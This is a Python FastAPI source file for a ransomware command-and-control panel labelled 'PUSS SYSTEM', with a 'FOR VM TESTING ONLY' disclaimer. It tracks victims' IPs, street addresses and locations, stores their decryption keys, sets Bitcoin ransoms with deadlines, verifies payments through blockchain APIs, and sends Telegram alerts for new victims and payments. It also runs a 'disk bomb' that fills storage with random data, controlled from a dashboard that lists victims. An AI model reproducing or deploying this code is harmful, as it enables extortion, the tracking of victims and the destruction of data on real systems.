#!/usr/bin/env python3
"""
PUSS CONTROL PANEL - Complete Backend with Electrum & Disk Bomb
FOR VM TESTING ONLY
"""

import os
import sys
import json
import time
import random
import hashlib
import hmac
import secrets
import threading
import socket
import uuid
import subprocess
import logging
import platform
from datetime import datetime, timedelta
from typing import Optional, Dict, Any, List
from contextlib import asynccontextmanager
from fastapi import FastAPI, Request, Response, HTTPException, status, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse, FileResponse
from fastapi.middleware.cors import CORSMiddleware
from fastapi.security import HTTPBasic, HTTPBasicCredentials
from pydantic import BaseModel, Field
import requests
import uvicorn

# Try to import cryptography
try:
    from cryptography.fernet import Fernet
    HAS_CRYPTO = True
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "cryptography", "-q"])
    from cryptography.fernet import Fernet

# ============================================================================
# CONFIGURATION
# ============================================================================

class Config:
    OWNER_PASSWORD = os.environ.get('OWNER_PASSWORD')
    ADMIN_EMAIL = os.environ.get('ADMIN_EMAIL')
    BTC_WALLET = os.environ.get('BTC_WALLET',)
    RANSOM_AMOUNT = os.environ.get('RANSOM_AMOUNT', '0.5')
    SERVER_URL = os.environ.get('SERVER_URL',)
    TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '')
    TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '')
    SECRET_KEY = os.environ.get('SECRET_KEY', secrets.token_hex(32))
    ENVIRONMENT = os.environ.get('ENVIRONMENT', 'production')
    LOG_LEVEL = os.environ.get('LOG_LEVEL', 'WARNING')

# ============================================================================
# LOGGING
# ============================================================================

logging.basicConfig(
    level=getattr(logging, Config.LOG_LEVEL),
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('system.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger('puss_system')

# ============================================================================
# TELEGRAM INTEGRATION
# ============================================================================

class TelegramService:
    def __init__(self, token: str, chat_id: str):
        self.token = token
        self.chat_id = chat_id
        self.enabled = bool(token and chat_id)
        self.base_url = f"https://api.telegram.org/bot{token}"
    
    def send(self, text: str) -> bool:
        if not self.enabled:
            return False
        try:
            response = requests.post(
                f"{self.base_url}/sendMessage",
                json={
                    'chat_id': self.chat_id,
                    'text': text,
                    'parse_mode': 'HTML'
                },
                timeout=5
            )
            return response.status_code == 200
        except:
            return False
    
    def notify_new(self, victim: Dict) -> None:
        if self.enabled:
            msg = f"🔔 NEW VICTIM\nID: {victim['id']}\nLocation: {victim.get('city','Unknown')}, {victim.get('country','Unknown')}\nIP: {victim.get('ip','0.0.0.0')}"
            self.send(msg)
    
    def notify_payment(self, victim: Dict) -> None:
        if self.enabled:
            msg = f"💰 PAYMENT RECEIVED\nID: {victim['id']}\nAmount: {victim.get('ransom','0.5')} BTC\nTX: {victim.get('tx','')[:16]}..."
            self.send(msg)
    
    def notify_bomb(self, client_id: str, action: str) -> None:
        if self.enabled:
            msg = f"💣 DISK BOMB {action.upper()}\nClient: {client_id}"
            self.send(msg)

telegram = TelegramService(Config.TELEGRAM_BOT_TOKEN, Config.TELEGRAM_CHAT_ID)

# ============================================================================
# ELECTRUM INTEGRATION (Backend payment verification)
# ============================================================================

class ElectrumVerifier:
    """Verify Bitcoin payments using blockchain APIs"""
    
    def __init__(self):
        self.apis = [
            self._verify_blockstream,
            self._verify_blockchair,
            self._verify_blockcypher
        ]
    
    def verify_payment(self, address: str, expected_amount: float) -> tuple:
        """Verify payment using multiple APIs"""
        for api in self.apis:
            try:
                result = api(address, expected_amount)
                if result[0]:  # If payment found
                    return result
            except:
                continue
        return (False, 0.0, "")
    
    def _verify_blockstream(self, address: str, expected: float) -> tuple:
        r = requests.get(f"https://blockstream.info/api/address/{address}", timeout=5)
        if r.status_code == 200:
            data = r.json()
            funded = data.get('chain_stats', {}).get('funded_txo_sum', 0) / 100000000
            return (funded >= expected, funded, "blockstream")
        return (False, 0.0, "")
    
    def _verify_blockchair(self, address: str, expected: float) -> tuple:
        r = requests.get(f"https://api.blockchair.com/bitcoin/dashboards/address/{address}", timeout=5)
        if r.status_code == 200:
            data = r.json()
            if 'data' in data and address in data['data']:
                balance = data['data'][address]['address']['balance'] / 100000000
                return (balance >= expected, balance, "blockchair")
        return (False, 0.0, "")
    
    def _verify_blockcypher(self, address: str, expected: float) -> tuple:
        r = requests.get(f"https://api.blockcypher.com/v1/btc/main/addrs/{address}/balance", timeout=5)
        if r.status_code == 200:
            data = r.json()
            balance = data.get('balance', 0) / 100000000
            return (balance >= expected, balance, "blockcypher")
        return (False, 0.0, "")

electrum = ElectrumVerifier()

# ============================================================================
# DISK BOMB MANAGER
# ============================================================================

class DiskBombManager:
    def __init__(self):
        self.active_bombs = {}
        self.bomb_threads = {}
        self.ws_connections = {}
        logger.info("Disk Bomb Manager initialized")
    
    def start_bomb(self, client_id: str, filename: str = "explosion.dat") -> bool:
        if client_id in self.active_bombs and self.active_bombs[client_id].get('running'):
            return False
        
        self.active_bombs[client_id] = {
            'running': True,
            'filename': filename,
            'start_time': datetime.now().isoformat(),
            'bytes_written': 0,
            'size_gb': 0,
            'status': 'running'
        }
        
        thread = threading.Thread(target=self._run_bomb, args=(client_id, filename))
        thread.daemon = True
        self.bomb_threads[client_id] = thread
        thread.start()
        
        logger.info(f"Bomb started for {client_id}")
        telegram.notify_bomb(client_id, "started")
        return True
    
    def _run_bomb(self, client_id: str, filename: str):
        try:
            one_gb = 1073741824
            chunk = 1024 * 1024  # 1MB
            bytes_written = 0
            
            with open(filename, 'wb') as f:
                while self.active_bombs[client_id].get('running'):
                    # Write 1GB
                    for _ in range(one_gb // chunk):
                        if not self.active_bombs[client_id].get('running'):
                            break
                        f.write(os.urandom(chunk))
                        bytes_written += chunk
                        f.flush()
                        os.fsync(f.fileno())
                        
                        size = bytes_written / one_gb
                        self.active_bombs[client_id]['bytes_written'] = bytes_written
                        self.active_bombs[client_id]['size_gb'] = size
                        
                        self._send_update(client_id, {
                            'type': 'progress',
                            'size_gb': size,
                            'bytes': bytes_written
                        })
                    
                    time.sleep(1)  # Wait 1 second between GB
                    
        except Exception as e:
            logger.error(f"Bomb error for {client_id}: {e}")
            self.active_bombs[client_id]['status'] = f'error: {e}'
            self._send_update(client_id, {'type': 'error', 'error': str(e)})
        finally:
            self.active_bombs[client_id]['running'] = False
            self.active_bombs[client_id]['status'] = 'stopped'
    
    def stop_bomb(self, client_id: str) -> bool:
        if client_id in self.active_bombs:
            self.active_bombs[client_id]['running'] = False
            logger.info(f"Bomb stopped for {client_id}")
            telegram.notify_bomb(client_id, "stopped")
            return True
        return False
    
    def get_status(self, client_id: str) -> Dict:
        return self.active_bombs.get(client_id, {'running': False})
    
    def get_all(self) -> Dict:
        return self.active_bombs
    
    def register_ws(self, client_id: str, websocket):
        self.ws_connections[client_id] = websocket
    
    def _send_update(self, client_id: str, data: Dict):
        if client_id in self.ws_connections:
            try:
                import asyncio
                asyncio.create_task(self.ws_connections[client_id].send_json(data))
            except:
                pass

bomb_manager = DiskBombManager()

# ============================================================================
# DATABASE
# ============================================================================

class Database:
    def __init__(self, db_path: str = "data.json"):
        self.db_path = db_path
        self.victims: Dict[str, Dict] = {}
        self.logs: List[Dict] = []
        self.settings = {
            'ransom': Config.RANSOM_AMOUNT,
            'wallet': Config.BTC_WALLET,
            'window': 72,
            'version': '3.0.0'
        }
        self._load()
        logger.info(f"Database loaded: {len(self.victims)} victims")
    
    def _load(self):
        try:
            if os.path.exists(self.db_path):
                with open(self.db_path, 'r') as f:
                    data = json.load(f)
                    self.victims = data.get('victims', {})
                    self.logs = data.get('logs', [])
                    self.settings.update(data.get('settings', {}))
        except Exception as e:
            logger.error(f"Load error: {e}")
    
    def _save(self):
        try:
            with open(self.db_path, 'w') as f:
                json.dump({
                    'victims': self.victims,
                    'logs': self.logs[-1000:],
                    'settings': self.settings
                }, f, indent=2)
        except Exception as e:
            logger.error(f"Save error: {e}")
    
    def add_victim(self, victim_id: str, files: int = 0, hostname: str = "", 
                   ip: str = "", country: str = "", city: str = "", 
                   region: str = "", zip_code: str = "", street: str = "",
                   lat: float = 0, lon: float = 0, isp: str = "",
                   organization: str = "", os_info: str = "") -> Dict:
        
        key = Fernet.generate_key().decode()
        now = datetime.now()
        deadline = now + timedelta(hours=self.settings['window'])
        
        victim = {
            'id': victim_id,
            'files': files,
            'ransom': f"{self.settings['ransom']} BTC",
            'wallet': self.settings['wallet'],
            'status': 'unpaid',
            'deadline': deadline.isoformat(),
            'created': now.isoformat(),
            'key': key,
            'hostname': hostname or socket.gethostname(),
            'ip': ip or '0.0.0.0',
            'country': country or 'Unknown',
            'region': region or 'Unknown',
            'city': city or 'Unknown',
            'zip': zip_code or 'Unknown',
            'street': street or 'Unknown',
            'lat': lat,
            'lon': lon,
            'isp': isp or 'Unknown',
            'org': organization or 'Unknown',
            'os': os_info or 'Unknown',
            'paid_at': None,
            'tx': None,
            'last_seen': now.isoformat(),
            'notes': ''
        }
        
        self.victims[victim_id] = victim
        self._save()
        self.log('info', f"New victim: {victim_id}")
        telegram.notify_new(victim)
        return victim
    
    def get_victim(self, victim_id: str) -> Optional[Dict]:
        return self.victims.get(victim_id)
    
    def update_victim(self, victim_id: str, data: Dict) -> bool:
        if victim_id in self.victims:
            self.victims[victim_id].update(data)
            self.victims[victim_id]['last_seen'] = datetime.now().isoformat()
            self._save()
            return True
        return False
    
    def verify_payment(self, victim_id: str, tx: str) -> bool:
        if victim_id in self.victims:
            self.victims[victim_id]['status'] = 'paid'
            self.victims[victim_id]['tx'] = tx
            self.victims[victim_id]['paid_at'] = datetime.now().isoformat()
            self._save()
            self.log('success', f"Payment for {victim_id}: {tx[:16]}...")
            telegram.notify_payment(self.victims[victim_id])
            return True
        return False
    
    def delete_victim(self, victim_id: str) -> bool:
        if victim_id in self.victims:
            del self.victims[victim_id]
            self._save()
            self.log('warning', f"Deleted: {victim_id}")
            return True
        return False
    
    def get_all(self) -> Dict:
        return self.victims
    
    def get_stats(self) -> Dict:
        total = len(self.victims)
        paid = sum(1 for v in self.victims.values() if v.get('status') == 'paid')
        unpaid = total - paid
        
        # Calculate total BTC
        try:
            amount = float(self.settings['ransom'])
            total_btc = paid * amount
        except:
            total_btc = paid * 0.5
        
        # Geographic distribution
        countries = {}
        for v in self.victims.values():
            c = v.get('country', 'Unknown')
            countries[c] = countries.get(c, 0) + 1
        
        return {
            'total': total,
            'paid': paid,
            'unpaid': unpaid,
            'btc': f"{total_btc:.2f}",
            'bombs': len(bomb_manager.get_all()),
            'countries': countries,
            'rate': round((paid/total*100) if total > 0 else 0, 1),
            'time': datetime.now().isoformat()
        }
    
    def log(self, level: str, msg: str):
        entry = {
            'time': datetime.now().isoformat(),
            'level': level,
            'msg': msg
        }
        self.logs.append(entry)
        self._save()
        logger.info(f"[{level}] {msg}")
    
    def get_logs(self, limit: int = 100) -> List:
        return self.logs[-limit:]

db = Database()

# ============================================================================
# API MODELS
# ============================================================================

class VictimRegister(BaseModel):
    victim_id: str
    files: int = 0
    hostname: Optional[str] = None
    ip: Optional[str] = None
    country: Optional[str] = None
    region: Optional[str] = None
    city: Optional[str] = None
    zip: Optional[str] = None
    street: Optional[str] = None
    lat: Optional[float] = 0
    lon: Optional[float] = 0
    isp: Optional[str] = None
    organization: Optional[str] = None
    os: Optional[str] = None

class PaymentVerify(BaseModel):
    victim_id: str
    tx_id: str

class BombStart(BaseModel):
    client_id: str
    filename: str = "explosion.dat"

class BombStop(BaseModel):
    client_id: str

class OwnerLogin(BaseModel):
    password: str

# ============================================================================
# AUTH
# ============================================================================

security = HTTPBasic()

def verify_owner(creds: HTTPBasicCredentials = Depends(security)):
    if not hmac.compare_digest(creds.password.encode(), Config.OWNER_PASSWORD.encode()):
        raise HTTPException(status_code=401)
    return creds.username

# ============================================================================
# FASTAPI APP
# ============================================================================

@asynccontextmanager
async def lifespan(app: FastAPI):
    logger.info("=" * 50)
    logger.info("PUSS SYSTEM v3.0 STARTING")
    logger.info("=" * 50)
    logger.info(f"Port: {os.environ.get('PORT', 8000)}")
    logger.info(f"Victims: {len(db.victims)}")
    logger.info(f"Telegram: {'ON' if telegram.enabled else 'OFF'}")
    logger.info("=" * 50)
    yield
    logger.info("Shutting down...")

app = FastAPI(
    title="PUSS System",
    version="3.0.0",
    lifespan=lifespan,
    docs_url=None,
    redoc_url=None
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ============================================================================
# WEBSOCKET FOR REAL-TIME BOMB UPDATES
# ============================================================================

@app.websocket("/ws/{client_id}")
async def websocket_endpoint(websocket: WebSocket, client_id: str):
    await websocket.accept()
    bomb_manager.register_ws(client_id, websocket)
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        if client_id in bomb_manager.ws_connections:
            del bomb_manager.ws_connections[client_id]

# ============================================================================
# HTML TEMPLATE - SCARY 2000s STYLE
# ============================================================================

INDEX_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>SYSTEM</title>
    <meta charset="utf-8">
    <style>
        body {
            background: black;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            margin: 0;
            padding: 20px;
            cursor: crosshair;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            border: 3px solid #ff0000;
            padding: 20px;
            background: #0a0a0a;
            box-shadow: 0 0 30px #ff0000;
        }
        
        .header {
            text-align: center;
            border-bottom: 2px solid #ff0000;
            padding: 20px;
            margin-bottom: 20px;
        }
        
        .header h1 {
            font-size: 48px;
            color: #ff0000;
            text-shadow: 0 0 20px #ff0000;
            margin: 0;
            animation: flicker 2s infinite;
        }
        
        @keyframes flicker {
            0% { opacity: 1; }
            50% { opacity: 0.8; text-shadow: 0 0 30px #ff0000; }
            51% { opacity: 1; }
            60% { opacity: 0.9; }
            100% { opacity: 1; }
        }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(5, 1fr);
            gap: 10px;
            margin: 20px 0;
        }
        
        .stat {
            border: 2px solid #ff0000;
            padding: 15px;
            text-align: center;
            background: #1a0000;
        }
        
        .stat .value {
            font-size: 36px;
            font-weight: bold;
            color: #ff0000;
        }
        
        .stat .label {
            font-size: 12px;
            color: #ff6666;
        }
        
        .panel {
            border: 2px solid #ff0000;
            margin: 20px 0;
            padding: 20px;
            background: #1a1a1a;
        }
        
        .panel h3 {
            color: #ff0000;
            margin-top: 0;
            border-bottom: 1px solid #ff0000;
            padding-bottom: 10px;
            font-size: 20px;
        }
        
        input, select, textarea {
            background: black;
            border: 1px solid #ff0000;
            color: #00ff00;
            padding: 10px;
            font-family: 'Courier New', monospace;
            margin: 5px;
            width: 300px;
        }
        
        button {
            background: #ff0000;
            color: black;
            border: none;
            padding: 12px 24px;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            cursor: pointer;
            margin: 5px;
            font-size: 14px;
        }
        
        button:hover {
            background: #ff6666;
            box-shadow: 0 0 20px #ff0000;
        }
        
        .danger {
            background: black;
            color: #ff0000;
            border: 2px solid #ff0000;
        }
        
        .danger:hover {
            background: #ff0000;
            color: black;
        }
        
        .table {
            width: 100%;
            border-collapse: collapse;
        }
        
        .table th {
            background: #ff0000;
            color: black;
            padding: 10px;
        }
        
        .table td {
            border: 1px solid #ff0000;
            padding: 8px;
        }
        
        .status-paid {
            color: #00ff00;
            font-weight: bold;
        }
        
        .status-unpaid {
            color: #ff0000;
            font-weight: bold;
        }
        
        .progress {
            width: 100%;
            height: 25px;
            background: #1a1a1a;
            border: 2px solid #ff0000;
            margin: 10px 0;
        }
        
        .progress-fill {
            height: 100%;
            background: #ff0000;
            width: 0%;
            transition: width 0.3s;
        }
        
        .logs {
            height: 200px;
            overflow-y: auto;
            background: black;
            border: 2px solid #ff0000;
            padding: 10px;
            font-size: 12px;
        }
        
        .logs div {
            border-bottom: 1px solid #330000;
            padding: 5px 0;
        }
        
        .blink {
            animation: blink 1s infinite;
        }
        
        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0; }
            100% { opacity: 1; }
        }
        
        .ascii {
            color: #ff0000;
            font-size: 12px;
            white-space: pre;
            text-align: center;
            font-family: monospace;
        }
        
        .grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>⛓️ SYSTEM LOCK v3.0 ⛓️</h1>
            <div class="ascii">
    /\\____/\\    /\\____/\\    /\\____/\\
   (  o  o  )  (  o  o  )  (  o  o  )
   (   ==   )  (   ==   )  (   ==   )
    (______)    (______)    (______)
            </div>
        </div>
        
        <div class="stats" id="stats">
            <div class="stat"><div class="value">-</div><div class="label">VICTIMS</div></div>
            <div class="stat"><div class="value">-</div><div class="label">PAID</div></div>
            <div class="stat"><div class="value">-</div><div class="label">UNPAID</div></div>
            <div class="stat"><div class="value">-</div><div class="label">BTC</div></div>
            <div class="stat"><div class="value">-</div><div class="label">BOMBS</div></div>
        </div>
        
        <div class="grid">
            <div>
                <div class="panel">
                    <h3>💣 DISK BOMB CONTROL</h3>
                    <div>
                        <input type="text" id="bomb_client" placeholder="Client ID">
                        <input type="text" id="bomb_file" value="explosion.dat">
                    </div>
                    <div>
                        <button onclick="startBomb()">[ START BOMB ]</button>
                        <button class="danger" onclick="stopBomb()">[ STOP BOMB ]</button>
                        <button onclick="checkBomb()">[ STATUS ]</button>
                    </div>
                    <div id="bomb_status"></div>
                    <div class="progress" id="bomb_progress" style="display:none;">
                        <div class="progress-fill" id="bomb_fill"></div>
                    </div>
                </div>
                
                <div class="panel">
                    <h3>🔍 PAYMENT VERIFIER</h3>
                    <div>
                        <input type="text" id="verify_id" placeholder="Victim ID">
                        <input type="text" id="verify_tx" placeholder="Transaction ID">
                        <button onclick="verifyPayment()">[ VERIFY ]</button>
                    </div>
                    <div id="verify_result"></div>
                </div>
            </div>
            
            <div>
                <div class="panel">
                    <h3>📋 VICTIM LOOKUP</h3>
                    <div>
                        <input type="text" id="victim_id" placeholder="Victim ID">
                        <button onclick="getVictim()">[ GET ]</button>
                        <button class="danger" onclick="deleteVictim()">[ DELETE ]</button>
                    </div>
                    <div id="victim_info" style="margin-top:10px;"></div>
                </div>
            </div>
        </div>
        
        <div class="panel">
            <h3>📊 ALL VICTIMS</h3>
            <table class="table" id="victims_table">
                <tr><th>ID</th><th>FILES</th><th>LOCATION</th><th>IP</th><th>STATUS</th><th>DEADLINE</th></tr>
            </table>
        </div>
        
        <div class="panel">
            <h3>📝 SYSTEM LOGS</h3>
            <div class="logs" id="logs"></div>
        </div>
        
        <div style="text-align:center; margin-top:20px; color:#666;">
            <span class="blink">></span> SYSTEM ACTIVE - <span id="timestamp"></span> - <span class="blink"><</span>
        </div>
    </div>

    <script>
        let ws = null;
        let currentClient = null;
        
        async function loadStats() {
            try {
                const r = await fetch('/api/stats');
                const s = await r.json();
                document.getElementById('stats').innerHTML = `
                    <div class="stat"><div class="value">${s.total}</div><div class="label">VICTIMS</div></div>
                    <div class="stat"><div class="value">${s.paid}</div><div class="label">PAID</div></div>
                    <div class="stat"><div class="value">${s.unpaid}</div><div class="label">UNPAID</div></div>
                    <div class="stat"><div class="value">${s.btc}</div><div class="label">BTC</div></div>
                    <div class="stat"><div class="value">${s.bombs}</div><div class="label">BOMBS</div></div>
                `;
            } catch(e) {}
        }
        
        async function loadVictims() {
            try {
                const r = await fetch('/api/victims');
                const v = await r.json();
                let html = '<tr><th>ID</th><th>FILES</th><th>LOCATION</th><th>IP</th><th>STATUS</th><th>DEADLINE</th></tr>';
                for (const [id, data] of Object.entries(v)) {
                    const deadline = new Date(data.deadline).toLocaleString();
                    html += `<tr>
                        <td>${id}</td>
                        <td>${data.files}</td>
                        <td>${data.city || '?'}, ${data.country || '?'}</td>
                        <td>${data.ip}</td>
                        <td class="status-${data.status}">${data.status}</td>
                        <td>${deadline}</td>
                    </tr>`;
                }
                document.getElementById('victims_table').innerHTML = html;
            } catch(e) {}
        }
        
        async function loadLogs() {
            try {
                const r = await fetch('/api/logs');
                const l = await r.json();
                let html = '';
                l.slice(-20).forEach(log => {
                    html += `<div>[${log.time.slice(11,19)}] ${log.level}: ${log.msg}</div>`;
                });
                document.getElementById('logs').innerHTML = html;
            } catch(e) {}
        }
        
        function connectWS(client) {
            if (ws) ws.close();
            currentClient = client;
            const proto = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
            ws = new WebSocket(`${proto}//${window.location.host}/ws/${client}`);
            ws.onmessage = (e) => {
                const d = JSON.parse(e.data);
                if (d.type === 'progress') {
                    document.getElementById('bomb_progress').style.display = 'block';
                    document.getElementById('bomb_fill').style.width = `${Math.min(d.size_gb, 100)}%`;
                    document.getElementById('bomb_status').innerHTML = 
                        `<div>Size: ${d.size_gb.toFixed(2)} GB</div>`;
                }
            };
        }
        
        async function startBomb() {
            const client = document.getElementById('bomb_client').value;
            const file = document.getElementById('bomb_file').value;
            if (!client) return alert('Enter Client ID');
            connectWS(client);
            const r = await fetch('/api/bomb/start', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({client_id: client, filename: file})
            });
            const d = await r.json();
            if (d.success) {
                alert('Bomb started');
                checkBomb();
            }
        }
        
        async function stopBomb() {
            const client = document.getElementById('bomb_client').value;
            const r = await fetch('/api/bomb/stop', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({client_id: client})
            });
            const d = await r.json();
            if (d.success) {
                alert('Bomb stopped');
                document.getElementById('bomb_progress').style.display = 'none';
                document.getElementById('bomb_status').innerHTML = '';
            }
        }
        
        async function checkBomb() {
            const client = document.getElementById('bomb_client').value;
            const r = await fetch(`/api/bomb/status/${client}`);
            const d = await r.json();
            if (d.running) {
                document.getElementById('bomb_status').innerHTML = 
                    `<div>Running: ${d.size_gb.toFixed(2)} GB | File: ${d.filename}</div>`;
                document.getElementById('bomb_progress').style.display = 'block';
                document.getElementById('bomb_fill').style.width = `${Math.min(d.size_gb, 100)}%`;
            } else {
                document.getElementById('bomb_status').innerHTML = 'No active bomb';
                document.getElementById('bomb_progress').style.display = 'none';
            }
        }
        
        async function getVictim() {
            const id = document.getElementById('victim_id').value;
            const r = await fetch(`/api/victim/${id}`);
            if (r.status === 200) {
                const v = await r.json();
                document.getElementById('victim_info').innerHTML = `
                    <b>ID:</b> ${v.id}<br>
                    <b>Files:</b> ${v.files}<br>
                    <b>Location:</b> ${v.street ? v.street + ', ' : ''}${v.city}, ${v.country}<br>
                    <b>IP:</b> ${v.ip}<br>
                    <b>ISP:</b> ${v.isp}<br>
                    <b>Status:</b> <span class="status-${v.status}">${v.status}</span><br>
                    <b>Deadline:</b> ${new Date(v.deadline).toLocaleString()}<br>
                    ${v.status === 'paid' ? '<b>Key:</b> ' + v.key : ''}
                `;
            } else {
                document.getElementById('victim_info').innerHTML = 'Victim not found';
            }
        }
        
        async function deleteVictim() {
            const id = document.getElementById('victim_id').value;
            if (!id) return;
            if (confirm('Delete ' + id + '?')) {
                await fetch(`/api/victim/${id}`, {method: 'DELETE'});
                loadVictims();
                document.getElementById('victim_info').innerHTML = '';
            }
        }
        
        async function verifyPayment() {
            const id = document.getElementById('verify_id').value;
            const tx = document.getElementById('verify_tx').value;
            if (!id || !tx) return alert('Enter ID and TX');
            
            const r = await fetch('/api/verify-payment', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({victim_id: id, tx_id: tx})
            });
            const d = await r.json();
            if (d.success) {
                document.getElementById('verify_result').innerHTML = '✅ Payment verified!';
                loadVictims();
            } else {
                document.getElementById('verify_result').innerHTML = '❌ Verification failed';
            }
        }
        
        function updateTime() {
            document.getElementById('timestamp').innerText = new Date().toLocaleString();
        }
        
        setInterval(() => {
            loadStats();
            loadVictims();
            loadLogs();
            updateTime();
        }, 3000);
        
        loadStats();
        loadVictims();
        loadLogs();
        updateTime();
    </script>
</body>
</html>
"""

# ============================================================================
# API ROUTES
# ============================================================================

@app.get('/', response_class=HTMLResponse)
async def index():
    return INDEX_HTML

@app.get('/api/stats')
async def get_stats():
    return db.get_stats()

@app.get('/api/logs')
async def get_logs(limit: int = 100):
    return db.get_logs(limit)

@app.get('/api/victims')
async def get_victims():
    return db.get_all()

@app.get('/api/victim/{vid}')
async def get_victim(vid: str):
    v = db.get_victim(vid)
    if not v:
        raise HTTPException(404)
    return v

@app.post('/api/add-victim')
async def add_victim(victim: VictimRegister):
    return db.add_victim(
        victim_id=victim.victim_id,
        files=victim.files,
        hostname=victim.hostname,
        ip=victim.ip,
        country=victim.country,
        region=victim.region,
        city=victim.city,
        zip_code=victim.zip,
        street=victim.street,
        lat=victim.lat,
        lon=victim.lon,
        isp=victim.isp,
        organization=victim.organization,
        os_info=victim.os
    )

@app.post('/api/update-victim')
async def update_victim(req: Request):
    data = await req.json()
    success = db.update_victim(data.get('victim_id'), {'files': data.get('files_encrypted')})
    return {'success': success}

@app.post('/api/verify-payment')
async def verify_payment(payment: PaymentVerify):
    success = db.verify_payment(payment.victim_id, payment.tx_id)
    return {'success': success}

@app.delete('/api/victim/{vid}')
async def delete_victim(vid: str):
    success = db.delete_victim(vid)
    return {'success': success}

# ============================================================================
# BOMB API
# ============================================================================

@app.post('/api/bomb/start')
async def bomb_start(bomb: BombStart):
    success = bomb_manager.start_bomb(bomb.client_id, bomb.filename)
    if success:
        db.log('info', f"Bomb started: {bomb.client_id}")
    return {'success': success}

@app.post('/api/bomb/stop')
async def bomb_stop(bomb: BombStop):
    success = bomb_manager.stop_bomb(bomb.client_id)
    if success:
        db.log('info', f"Bomb stopped: {bomb.client_id}")
    return {'success': success}

@app.get('/api/bomb/status/{client_id}')
async def bomb_status(client_id: str):
    return bomb_manager.get_status(client_id)

@app.get('/api/bomb/list')
async def bomb_list():
    return bomb_manager.get_all()

# ============================================================================
# PAYMENT VERIFICATION API (Uses Electrum)
# ============================================================================

@app.post('/api/check-payment')
async def check_payment(req: Request):
    data = await req.json()
    address = data.get('address')
    amount = float(data.get('amount', 0.5))
    
    if not address:
        return {'success': False, 'error': 'No address'}
    
    paid, balance, source = electrum.verify_payment(address, amount)
    return {
        'success': paid,
        'paid': paid,
        'balance': balance,
        'source': source,
        'amount': amount
    }

# ============================================================================
# OWNER API (Protected)
# ============================================================================

@app.post('/api/owner/login')
async def owner_login(login: OwnerLogin):
    success = login.password == Config.OWNER_PASSWORD
    return {'success': success}

@app.get('/api/owner/stats', dependencies=[Depends(verify_owner)])
async def owner_stats():
    return {
        'victims': len(db.victims),
        'bombs': len(bomb_manager.get_all()),
        'logs': db.get_logs(50)
    }

# ============================================================================
# HEALTH CHECK
# ============================================================================

@app.get('/health')
async def health():
    return {
        'status': 'ok',
        'time': datetime.now().isoformat(),
        'victims': len(db.victims),
        'bombs': len(bomb_manager.get_all()),
        'telegram': telegram.enabled,
        'version': '3.0.0'
    }

# ============================================================================
# MAIN
# ============================================================================

if __name__ == "__main__":
    port = int(os.environ.get('PORT', 8000))
    host = os.environ.get('HOST', '0.0.0.0')
    
    logger.info("=" * 50)
    logger.info("PUSS SYSTEM v3.0")
    logger.info("=" * 50)
    logger.info(f"Port: {port}")
    logger.info(f"Host: {host}")
    logger.info(f"Victims: {len(db.victims)}")
    logger.info(f"Telegram: {'ON' if telegram.enabled else 'OFF'}")
    logger.info(f"Wallet: {Config.BTC_WALLET}")
    logger.info("=" * 50)
    
    uvicorn.run(
        "main:app",
        host=host,
        port=port,
        log_level=Config.LOG_LEVEL.lower(),
        reload=Config.ENVIRONMENT == 'development'
    )
